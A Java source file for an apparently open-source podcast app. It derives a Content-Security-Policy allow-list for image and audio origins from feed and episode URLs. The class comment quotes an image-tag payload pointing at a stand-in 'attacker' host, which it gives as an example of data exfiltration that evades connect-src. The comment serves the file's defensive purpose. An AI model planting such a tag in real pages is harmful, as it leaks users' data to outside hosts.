// SPDX-License-Identifier: AGPL-3.0-or-later
// SPDX-FileCopyrightText: 2026 The Mosaicast Authors

package dev.mosaicast.core.config;

import jakarta.persistence.EntityManager;
import java.net.URI;
import java.util.Arrays;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.context.event.ApplicationReadyEvent;
import org.springframework.context.event.EventListener;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;
import org.springframework.transaction.annotation.Transactional;

/**
 * The https origins this site's own content is served from — feed artwork, episode artwork and episode
 * audio — so {@code img-src} and {@code media-src} can name them instead of allowing every host on the web.
 *
 * <p>The blanket {@code https:} those directives carry by default is not laziness: artwork and audio come
 * from whatever host the podcaster's feed points at, which the host does not choose and cannot predict.
 * The cost is that {@code <img src="https://attacker/p.gif?d=…">} is a working one-way exfiltration channel
 * that side-steps {@code connect-src 'self'} and the consent framework entirely — a real gap, and one an
 * audit demonstrated against this app's own sample plugin.
 *
 * <p>So the narrowing is derived rather than configured: whatever the feeds actually reference is what the
 * policy allows. That is the only version an operator will leave switched on, because a hand-written
 * allow-list goes stale the first time a podcaster changes CDN and the failure is a blank page.
 *
 * <p><strong>Still opt-in</strong> ({@code mosaicast.security.strict-media-sources}), and the reason is worth
 * stating precisely: this sees the URL a feed <em>publishes</em>, while the browser enforces against the URL
 * the request <em>ends at</em>. Most media CDNs redirect, so the redirect target is a host this cannot know.
 * Nor can it see an image inside show-note HTML, or a feed added a minute ago. Following redirects to find
 * out would mean the host fetching every artwork URL on a schedule, which is a worse trade than a setting.
 * {@code mosaicast.security.extra-media-sources} covers the remainder, and an operator switching this on
 * should expect to use it.
 *
 * <p>Refreshed on startup and every fifteen minutes. Deliberately not on every feed poll: the CSP is written
 * per request, so this must be a set read and never a query, and a snapshot that lags a new feed by a few
 * minutes costs one artwork placeholder while a per-poll invalidation would put a listener on the ingestion
 * path for a header.
 */
@Component
public class ExternalMediaHostRegistry {

    private static final Logger log = LoggerFactory.getLogger(ExternalMediaHostRegistry.class);

    /**
     * Every https URL the site renders as an image or plays as audio.
     *
     * <p>Native, and reaching into the snapshot JSONB, because that is where episode artwork and audio live
     * (§4.2) — there is no column to map. WITHDRAWN episodes are included on purpose: they can still be
     * referenced by a cached page or a share card, and the set is an allow-list rather than an inventory.
     */
    private static final String QUERY = """
            select f.image_url from feed f where f.image_url is not null
            union
            select ed.snapshot ->> 'imageUrl' from episode_display ed
              where ed.snapshot ->> 'imageUrl' is not null
            union
            select ed.snapshot ->> 'audioUrl' from episode_display ed
              where ed.snapshot ->> 'audioUrl' is not null
            """;

    private final EntityManager entityManager;
    private final Set<String> extra;

    /** The last computed snapshot. Read on every request, replaced wholesale on refresh. */
    private volatile Set<String> origins = Set.of();

    public ExternalMediaHostRegistry(
            EntityManager entityManager,
            @Value("${mosaicast.security.extra-media-sources:}") String extraSources) {
        this.entityManager = entityManager;
        this.extra = Arrays.stream(extraSources.split(","))
                .map(String::trim)
                .filter(source -> !source.isEmpty())
                .collect(java.util.stream.Collectors.toCollection(LinkedHashSet::new));
    }

    /**
     * The origins to allow, as CSP source expressions ({@code https://host} or {@code https://host:port}).
     *
     * <p>Never blocks and never throws: this is called while writing a response header, so a slow or broken
     * refresh must degrade to the previous snapshot rather than to a 500 on every page.
     */
    public Set<String> origins() {
        if (extra.isEmpty()) {
            return origins;
        }
        Set<String> combined = new LinkedHashSet<>(origins);
        combined.addAll(extra);
        return Set.copyOf(combined);
    }

    /** Recomputes the snapshot. Failure keeps the previous one — a stale allow-list beats an empty one. */
    @EventListener(ApplicationReadyEvent.class)
    @Scheduled(initialDelay = 15, fixedRate = 15, timeUnit = java.util.concurrent.TimeUnit.MINUTES)
    @Transactional(readOnly = true)
    public void refresh() {
        try {
            @SuppressWarnings("unchecked")
            List<String> urls = entityManager.createNativeQuery(QUERY, String.class).getResultList();
            Set<String> resolved = urls.stream()
                    .map(ExternalMediaHostRegistry::originOf)
                    .filter(java.util.Objects::nonNull)
                    .collect(java.util.stream.Collectors.toCollection(LinkedHashSet::new));
            this.origins = Set.copyOf(resolved);
            log.debug("Media source allow-list refreshed: {} origin(s)", resolved.size());
        } catch (RuntimeException e) {
            log.warn("Could not refresh the media source allow-list; keeping {} origin(s) from before",
                    origins.size(), e);
        }
    }

    /**
     * The CSP source expression for a URL, or {@code null} if it is not one this policy can name.
     *
     * <p>https only. A plaintext http source is dropped rather than allowed: the page itself is served over
     * https wherever this matters, so the browser would refuse it as mixed content anyway, and naming it in
     * the policy would only suggest otherwise.
     */
    static String originOf(String url) {
        if (url == null || url.isBlank()) {
            return null;
        }
        try {
            URI uri = new URI(url.trim());
            String scheme = uri.getScheme();
            String host = uri.getHost();
            if (scheme == null || !scheme.equalsIgnoreCase("https") || host == null || host.isBlank()) {
                return null;
            }
            String origin = "https://" + host.toLowerCase(Locale.ROOT);
            return uri.getPort() == -1 ? origin : origin + ":" + uri.getPort();
        } catch (java.net.URISyntaxException e) {
            return null;
        }
    }
}
